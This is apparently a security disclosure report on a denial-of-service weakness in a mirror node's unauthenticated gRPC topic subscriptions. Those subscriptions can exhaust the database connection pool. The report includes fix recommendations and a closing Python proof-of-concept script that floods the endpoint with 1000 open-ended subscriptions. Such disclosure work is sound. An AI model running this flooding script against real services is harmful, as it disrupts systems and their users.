### Title
Unauthenticated Unbounded `subscribeTopic()` gRPC Subscriptions Exhaust Database Connection Pool via Per-Subscriber Polling

### Summary
The `subscribeTopic()` gRPC endpoint in `ConsensusController` requires no authentication and enforces no global subscriber cap. When the `POLL` listener type is active, each accepted subscription spawns an independent, indefinitely-repeating database polling loop on a `boundedElastic` scheduler thread, each consuming a HikariCP connection on every poll cycle. An attacker opening enough connections across multiple TCP sessions can saturate the finite connection pool, starving all other database-dependent operations including transaction ingestion and confirmation.

### Finding Description
**Entry point** — `ConsensusController.subscribeTopic()` (lines 43–53) accepts any `ConsensusTopicQuery` with no authentication interceptor, no per-IP limit, and no global subscriber ceiling. The only server-side guard is `maxConcurrentCallsPerConnection = 5` (`NettyProperties`, line 14), which limits streams *per TCP connection* but places no bound on the number of TCP connections.

**Subscriber counter is metric-only** — `TopicMessageServiceImpl` maintains `subscriberCount` (line 48) as a Micrometer `Gauge` (lines 52–55). It is incremented on subscribe and decremented on termination (lines 89–90) but is **never compared against a maximum**; it cannot reject new subscriptions.

**Per-subscriber DB polling with `POLL` type** — When `ListenerProperties.type = POLL` (configurable, `ListenerProperties` line 37), `CompositeTopicListener.getTopicListener()` returns a `PollingTopicListener` instance. `PollingTopicListener.listen()` (lines 34–48) creates a per-subscription `PollingContext` and schedules `Flux.defer(() -> poll(context))` with `RepeatSpec.times(Long.MAX_VALUE)` on `Schedulers.boundedElastic()`, polling every 500 ms indefinitely. Each `poll()` call (lines 51–62) invokes `topicMessageRepository.findByFilter(newFilter)` → `TopicMessageRepositoryCustomImpl.findByFilter()` (lines 33–61), which executes a JPA `TypedQuery` via `EntityManager`, acquiring a HikariCP connection for the duration of each query.

**Historical retriever also runs per subscriber** — Even with the default `REDIS` listener type, `TopicMessageServiceImpl.subscribeTopic()` (line 63) calls `topicMessageRetriever.retrieve(filter, true)` for every new subscriber. `PollingTopicMessageRetriever.retrieve()` (lines 45–63) schedules polling with `numRepeats = Long.MAX_VALUE` on its own `Schedulers.boundedElastic()` scheduler, each poll hitting the DB. A flood of concurrent subscriptions creates a flood of concurrent historical-retrieval DB queries before Redis takes over.

**No rate limiting in the gRPC module** — The `ThrottleConfiguration`/`ThrottleManagerImpl` rate-limiting infrastructure exists only in the `web3` module. The sole gRPC interceptor (`GrpcInterceptor`, lines 16–22) only sets `EndpointContext` for table-usage tracking; it performs no rate limiting or connection counting.

**Exploit flow:**
1. Attacker opens *M* TCP connections to port 5600 (no per-IP connection limit configured in `GrpcConfiguration`).
2. On each connection, attacker opens 5 `subscribeTopic()` streams (the `maxConcurrentCallsPerConnection` ceiling), each targeting any known valid topic ID, with no `consensusEndTime` and no `limit` (open-ended, never self-terminating).
3. Total active subscriptions = M × 5. With `POLL` type, each subscription independently polls the DB every 500 ms, holding a HikariCP connection per poll.
4. HikariCP pool (no explicit size configured in the grpc module; Spring Boot default is 10) is exhausted once concurrent in-flight queries exceed the pool size.
5. All other components (importer, REST API, transaction confirmation pipeline) that share or depend on the same database instance begin timing out or queuing indefinitely.

### Impact Explanation
Full exhaustion of the HikariCP connection pool blocks every database operation in the gRPC service. Because the mirror node's transaction confirmation pipeline depends on database writes from the importer, sustained pool exhaustion prevents new consensus data from being persisted and served, effectively halting transaction confirmation visibility across the network. The `GrpcHighDBConnections` alert (Prometheus rule: `hikaricp_connections_active / hikaricp_connections_max > 0.75`) confirms the operators themselves recognize this as a critical resource boundary.

### Likelihood Explanation
The attack requires only a gRPC client library (freely available) and network access to port 5600. No credentials, tokens, or privileged knowledge are needed. The attacker does not need to know real topic IDs if `checkTopicExists = false`; with `checkTopicExists = true` (default), any publicly observable topic ID suffices. The attack is trivially repeatable and scriptable. The `POLL` listener type is a documented, supported configuration option. Even under the default `REDIS` type, the historical-retrieval phase creates a partial exhaustion window during a subscription flood.

### Recommendation
1. **Enforce a global subscriber cap**: Add a configurable `maxSubscribers` property to `GrpcProperties` and reject new `subscribeTopic()` calls in `TopicMessageServiceImpl.subscribeTopic()` when `subscriberCount.get() >= maxSubscribers`, returning `RESOURCE_EXHAUSTED`.
2. **Add per-IP connection rate limiting**: Configure `maxConnectionsPerIp` or use a gRPC `ServerInterceptor` to count and cap concurrent streams per remote address.
3. **Require authentication for open-ended subscriptions**: Add a gRPC `ServerInterceptor` that enforces an API key or JWT for subscriptions with no `limit` and no `consensusEndTime`.
4. **Mandate a maximum subscription duration/limit**: Reject or auto-terminate subscriptions that specify neither `consensusEndTime` nor a non-zero `limit`, preventing indefinitely-held polling loops.
5. **Isolate the gRPC DB connection pool**: Configure a dedicated, size-bounded HikariCP pool for the gRPC module so exhaustion cannot cascade to the importer.

### Proof of Concept
```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1  # any known valid topic

def open_subscription(_):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(
            shardNum=TOPIC_SHARD, realmNum=TOPIC_REALM, topicNum=TOPIC_NUM),
        # No consensusEndTime, no limit → open-ended, never self-terminates
    )
    try:
        for _ in stub.subscribeTopic(query):  # blocks, holding DB poll loop open
            pass
    except Exception:
        pass

# Open 200 connections × 5 streams each = 1000 concurrent subscriptions
threads = [threading.Thread(target=open_subscription, args=(i,)) for i in range(1000)]
for t in threads:
    t.start()
# Monitor: hikaricp_connections_active{application="grpc"} → pool exhausted
# Result: all subsequent DB operations time out; transaction confirmation halts
```